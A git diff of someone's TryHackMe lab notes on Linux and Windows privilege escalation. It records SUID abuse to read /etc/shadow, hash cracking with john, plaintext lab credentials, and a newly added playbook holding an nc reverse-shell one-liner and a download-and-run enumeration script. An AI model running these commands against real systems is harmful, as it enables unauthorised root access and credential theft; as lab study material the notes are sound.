@@ -447,7 +447,7 @@ after entering
 clone this 
 https://github.com/mzet-/linux-exploit-suggester and use it 
 
-
+```
 ./les.sh > exploits.txt           
 karen@wade7363:/tmp$ cat exploits.txt | grep "high" -B3 -A3
 [+] [CVE-2016-5195] dirtycow
@@ -494,6 +494,7 @@ root@wade7363:/tmp# find / -name flag1.txt 2>/dev/null
 /home/matt/flag1.txt
 root@wade7363:/tmp# cat /home/matt/flag1.txt
 THM-28392872729920
+```
 
 ### PRIVILEGE ESCALATION: SUDO 
 
@@ -548,10 +549,9 @@ frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelW
 
 ### SUID
 
-me=10.10.34.0
+me=10.10.34.0  
 target=10.10.145.190
 
----
 ```
 karen@ip-10-10-145-190:/$ find / -type f -perm -04000 -ls 2>/dev/null
 66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/10185/bin/mount
@@ -604,37 +604,7 @@ karen@ip-10-10-145-190:/$ find / -type f -perm -04000 -ls 2>/dev/null
 karen@ip-10-10-145-190:/$ base64 "$LFILE" | base64 --decode
 root:*:18561:0:99999:7:::
 daemon:*:18561:0:99999:7:::
-bin:*:18561:0:99999:7:::
-sys:*:18561:0:99999:7:::
-sync:*:18561:0:99999:7:::
-games:*:18561:0:99999:7:::
-man:*:18561:0:99999:7:::
-lp:*:18561:0:99999:7:::
-mail:*:18561:0:99999:7:::
-news:*:18561:0:99999:7:::
-uucp:*:18561:0:99999:7:::
-proxy:*:18561:0:99999:7:::
-www-data:*:18561:0:99999:7:::
-backup:*:18561:0:99999:7:::
-list:*:18561:0:99999:7:::
-irc:*:18561:0:99999:7:::
-gnats:*:18561:0:99999:7:::
-nobody:*:18561:0:99999:7:::
-systemd-network:*:18561:0:99999:7:::
-systemd-resolve:*:18561:0:99999:7:::
-systemd-timesync:*:18561:0:99999:7:::
-messagebus:*:18561:0:99999:7:::
-syslog:*:18561:0:99999:7:::
-_apt:*:18561:0:99999:7:::
-tss:*:18561:0:99999:7:::
-uuidd:*:18561:0:99999:7:::
-tcpdump:*:18561:0:99999:7:::
-sshd:*:18561:0:99999:7:::
-landscape:*:18561:0:99999:7:::
-pollinate:*:18561:0:99999:7:::
-ec2-instance-connect:!:18561:0:99999:7:::
-systemd-coredump:!!:18796::::::
-ubuntu:!:18796:0:99999:7:::
+...
 gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
 user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
 lxd:!:18796::::::
@@ -642,9 +612,6 @@ karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCb
 
 
 # Trying to add new user 
-
-
-
 karen@ip-10-10-145-190:/$ openssl passwd -1 salt THM password1
 $1$LCMt6sYj$eMjuju4VvP1UhDjXSn/l1.
 $1$LWyLH.MM$dCKqWAkMvKYgrVkDMeR1Z.
@@ -653,18 +620,13 @@ $1$P1Nyji49$6sB6qmdPCXeCH4HSnupmS/
 ```
 
 
-
+after getting /etc/passwd and /etc/shadow
 ```
 ┌──(root㉿kali)-[~/repo]
 └─# unshadow passwd shadow > list.txt
 
 ┌──(root㉿kali)-[~/repo]
-└─# john --worldlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt list.txt
-Unknown option: "--worldlist=/usr/share/wordlists/rockyou.txt"
-
-┌──(root㉿kali)-[~/repo]
-└─# fc
-john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt list.txt
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt list.txt
 Using default input encoding: UTF-8
 Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
@@ -679,38 +641,6 @@ Session completed.
 
 # getting the flag 
 gerryconway@ip-10-10-145-190:/$ find / -type f -perm -04000 -ls 2>/dev/null
-66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/10185/bin/mount
-80     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /snap/core/10185/bin/ping
-81     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /snap/core/10185/bin/ping6
-98     40 -rwsr-xr-x   1 root     root        40128 Mar 25  2019 /snap/core/10185/bin/su
-116     27 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /snap/core/10185/bin/umount
-2610     71 -rwsr-xr-x   1 root     root        71824 Mar 25  2019 /snap/core/10185/usr/bin/chfn
-2612     40 -rwsr-xr-x   1 root     root        40432 Mar 25  2019 /snap/core/10185/usr/bin/chsh
-2689     74 -rwsr-xr-x   1 root     root        75304 Mar 25  2019 /snap/core/10185/usr/bin/gpasswd
-2781     39 -rwsr-xr-x   1 root     root        39904 Mar 25  2019 /snap/core/10185/usr/bin/newgrp
-2794     53 -rwsr-xr-x   1 root     root        54256 Mar 25  2019 /snap/core/10185/usr/bin/passwd
-2904    134 -rwsr-xr-x   1 root     root       136808 Jan 31  2020 /snap/core/10185/usr/bin/sudo
-3003     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/10185/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-3375    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/10185/usr/lib/openssh/ssh-keysign
-6437    109 -rwsr-xr-x   1 root     root              110792 Oct  8  2020 /snap/core/10185/usr/lib/snapd/snap-confine
-7615    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/10185/usr/sbin/pppd
-56     43 -rwsr-xr-x   1 root     root               43088 Mar  5  2020 /snap/core18/1885/bin/mount
-65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/1885/bin/ping
-81     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /snap/core18/1885/bin/su
-99     27 -rwsr-xr-x   1 root     root               26696 Mar  5  2020 /snap/core18/1885/bin/umount
-1698     75 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn
-1700     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh
-1752     75 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd
-1816     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp
-1828     59 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd
-1919    146 -rwsr-xr-x   1 root     root              149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo
-2006     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-2314    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
-7477     52 -rwsr-xr--   1 root     messagebus         51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-13816    464 -rwsr-xr-x   1 root     root              473576 May 29  2020 /usr/lib/openssh/ssh-keysign
-13661     24 -rwsr-xr-x   1 root     root               22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-7479     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-13676    128 -rwsr-xr-x   1 root     root              130152 Oct  8  2020 /usr/lib/snapd/snap-confine
 1856     84 -rwsr-xr-x   1 root     root               85064 May 28  2020 /usr/bin/chfn
 2300     32 -rwsr-xr-x   1 root     root               31032 Aug 16  2019 /usr/bin/pkexec
 1816    164 -rwsr-xr-x   1 root     root              166056 Jul 15  2020 /usr/bin/sudo
@@ -724,23 +654,18 @@ gerryconway@ip-10-10-145-190:/$ find / -type f -perm -04000 -ls 2>/dev/null
 2028     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
 2166     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
 1633     56 -rwsr-xr-x   1 root     root               55528 Jul 21  2020 /usr/bin/mount
-gerryconway@ip-10-10-145-190:/$ find / -name flag3.txt 2>/dev/nukk
-bash: /dev/nukk: Permission denied
+
 gerryconway@ip-10-10-145-190:/$ find / -name flag3.txt 2>/dev/null
 /home/ubuntu/flag3.txt
 gerryconway@ip-10-10-145-190:/$ LFILE=/home/ubuntu/flag3.txt
 gerryconway@ip-10-10-145-190:/$ base64 "$LFILE" | base64 --decode
 THM-3847834
-
-
 ```
 
+### PRIVILEGE ESCALATION: Capabilities
 
-
-## PRIVILEGE ESCALATION: Capabilities
-
-me=10.10.38.133
-target=10.10.149.140
+me=10.10.38.133  
+target=10.10.149.140  
 
 ```
 karen@ip-10-10-149-140:~$ getcap -r / 2>/dev/null
@@ -786,7 +711,6 @@ root@ip-10-10-149-140:~# find / -name flag4.txt 2>/dev/null
 /home/ubuntu/flag4.txt
 root@ip-10-10-149-140:~# cat /home/ubuntu/flag4.txt
 THM-9349843
-
 ```
 
 Another way to escalate is by using view
@@ -813,7 +737,6 @@ getcap -r / 2>/dev/null
 
 me=10.10.39.133
 target=10.10.56.58
-
 
 ```
 karen@ip-10-10-56-58:~$ cat /etc/crontab
@@ -918,8 +841,8 @@ john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadow.t
 
 
 ### LINUX PRIVILEGE ESCALATION: PATH 
-me=10.10.4.105
-target=10.10.146.169
+me=10.10.4.105  
+target=10.10.146.169  
 
 ```
 karen@ip-10-10-146-169:/$ id
@@ -1062,14 +985,14 @@ int main(void){
 ### Troubleshoot
 ./code: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./code)
 > Kali Linux box was not working because the gcc compiler was too high, 
-> I used the attack box 
+> I used the attack box  and it worked 
 
 
 karen@ip-10-10-2-24:/home/ubuntu/sharedfolder$ ./code
 ./code: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./code)
 > Return to this task Privilege Escalation via NFS 
 
-**RETRY on ATTACKBOX**  
+**RETRY on ATTACKBOX**    
 me=10.10.79.12
 target=10.10.2.24
 
@@ -1107,12 +1030,12 @@ THM-89384012
 
 ### CAPSTONE
 
-me=10.10.165.119
-target=10.10.4.59
+me=10.10.165.119  
+target=10.10.4.59  
 
-leonard
+leonard  
 Penny123
-a
+
 
 ```
 [leonard@ip-10-10-4-59 ~]$ ls -la /home
@@ -1124,7 +1047,6 @@ drwx------. 16 missy   missy   4096 Jun  7  2021 missy
 drwx------.  2 root    root      23 Jun  7  2021 rootflag
 
 # tried crontab
-
 [leonard@ip-10-10-4-59 ~]$ wget 10.10.165.119:9999/les.sh
 --2022-11-30 15:05:29--  http://10.10.165.119:9999/les.sh
 Connecting to 10.10.165.119:9999... connected.
@@ -1155,7 +1077,6 @@ Saving to: \u2018les.sh\u2019
 
 dirty cow did not work, now trying the SUID approach
 ```
-[leonard@ip-10-10-4-59 ~]$ find / -type -perm -04000 -ls 2>/dev/null
 [leonard@ip-10-10-4-59 ~]$ find / -type f -perm -04000 -ls 2>/dev/null
 16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
 17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
@@ -1163,34 +1084,10 @@ dirty cow did not work, now trying the SUID approach
 17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
 17698538   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
 17698537   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
-17698541   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
-17702679  208 ---s--x---   1 root     stapusr    212080 Oct 13  2020 /usr/bin/staprun
-17743302   24 -rws--x--x   1 root     root        23968 Sep 30  2020 /usr/bin/chfn
-17743352   32 -rwsr-xr-x   1 root     root        32128 Sep 30  2020 /usr/bin/su
-17743305   24 -rws--x--x   1 root     root        23880 Sep 30  2020 /usr/bin/chsh
-17831141 2392 -rwsr-xr-x   1 root     root      2447304 Apr  1  2020 /usr/bin/Xorg
-17743338   44 -rwsr-xr-x   1 root     root        44264 Sep 30  2020 /usr/bin/mount
-17743356   32 -rwsr-xr-x   1 root     root        31984 Sep 30  2020 /usr/bin/umount
 17812176   60 -rwsr-xr-x   1 root     root        57656 Aug  9  2019 /usr/bin/crontab
 17787689   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
 18382172   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
 20386935  144 ---s--x--x   1 root     root       147336 Sep 30  2020 /usr/bin/sudo
-34469385   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
-34469387   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
-36070283   12 -rwsr-xr-x   1 root     root        11296 Oct 13  2020 /usr/sbin/usernetctl
-35710927   40 -rws--x--x   1 root     root        40328 Aug  9  2019 /usr/sbin/userhelper
-38394204  116 -rwsr-xr-x   1 root     root       117432 Sep 30  2020 /usr/sbin/mount.nfs
-958368   16 -rwsr-xr-x   1 root     root        15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
-37709347   12 -rwsr-xr-x   1 root     root        11128 Oct 13  2020 /usr/libexec/kde4/kpac_dhcp_helper
-51455908   60 -rwsr-x---   1 root     dbus        57936 Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
-17836404   16 -rwsr-xr-x   1 root     root        15448 Apr  1  2020 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
-18393221   16 -rwsr-xr-x   1 root     root        15360 Oct  1  2020 /usr/libexec/qemu-bridge-helper
-37203442  156 -rwsr-x---   1 root     sssd       157872 Oct 15  2020 /usr/libexec/sssd/krb5_child
-37203771   84 -rwsr-x---   1 root     sssd        82448 Oct 15  2020 /usr/libexec/sssd/ldap_child
-37209171   52 -rwsr-x---   1 root     sssd        49592 Oct 15  2020 /usr/libexec/sssd/selinux_child
-37209165   28 -rwsr-x---   1 root     sssd        27792 Oct 15  2020 /usr/libexec/sssd/proxy_child
-18270608   16 -rwsr-sr-x   1 abrt     abrt        15344 Oct  1  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
-18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap
 
 
 [leonard@ip-10-10-4-59 ~]$ LFILE=/etc/passwd
@@ -1257,7 +1154,6 @@ User missy may run the following commands on ip-10-10-4-59:
 
 ```
 
-
 Find can be searched now
 ```
 [leonard@ip-10-10-4-59 ~]$ LFILE=/home/missy/Documents/flag1.txt
@@ -1268,9 +1164,9 @@ THM-42828719920544
 [leonard@ip-10-10-4-59 ~]$ LFILE=/home/rootflag/flag2.txt
 [leonard@ip-10-10-4-59 ~]$ base64 "$LFILE" | base64 --decode
 THM-168824782390238
-
- 
 ```
+
+
 ---
 
 ## WINDOWS PRIVILEGE ESCALATION 
@@ -1292,12 +1188,10 @@ Windows Non User Account
 me=10.10.135.71
 target=10.10.154.247
 
-
-
-``
+```
 root@ip-10-10-135-71:~/repo# xfreerdp /u:thm-unpriv /p:Password321 /cert:ignore /v:10.10.154.247
 connected to 10.10.154.247:3389
-``
+```
 
 Powershell History
 > cmd : type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt  
@@ -1354,7 +1248,7 @@ IIS Configuration
 Look at these ` type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString `
 
 
-``
+```
 PS C:\Windows\system32\sysprep> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
@@ -1362,11 +1256,10 @@ type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr
 <connectionStrings>
 <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
 </connectionStrings>
-
-``
+```
 
 **RETRIEVE CREDENTIALS FROM Software: Putty**
-``
+```
 
 PS C:\Windows\system32\sysprep> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
@@ -1520,9 +1413,60 @@ Linux Privilege Escalation:
 - Sudo 
 > sudo -l, gtfobins.github.io
 - SUID 
-> 
-
+> find / type f -perm -0400 -ls 2>/dev/null 
 - CAPABILITIES 
 > getcap -r 2>/dev/null 
  
 
+### PLAYBOOK 1 - Linux 
+**Getting the Shell**
+
+Create Reverse Shell Listener
+```
+nc -lvnp 4444
+```
+
+From the Victim machine, this will connect to the listener
+```
+mkfifo /tmp/f; nc 10.10.10.10 4444 </tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
+
+Back to the listener you must stabilize the shell 
+```
+nc -lvnp 4444
+... connected
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+`ctrl+z`
+stty raw -echo;fg 
+```
+
+
+**PRIVILIGE ESCALATION**
+> Once obtaining shell you next goal is to escalate priviliges 
+```bash
+mkdir -p /tmp/hvck
+cd /tmp/hvck
+
+# Linux Smart Enumeration 
+wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh 
+echo "[+] Enumerating"
+bash lse.sh
+
+
+# LINUX EXPLOIT SUGGESTER 
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+echo "[+] Checking for Common Exploits" 
+bash les.sh > exploits.txt 
+cat exploits.txt | grep "high" -B3 -A3
+
+# Check SUID 
+echo "[+] Checking for SUID"
+find / type f -perm -0400 -ls 2>/dev/null | grep rwsr
+echo "[+] Check here: https://gtfobins.github.io/"
+
+# Check Capabilities 
+echo "[+] Checking for Root Capabilities"
+getcap -r / 2>/dev/null 
+```
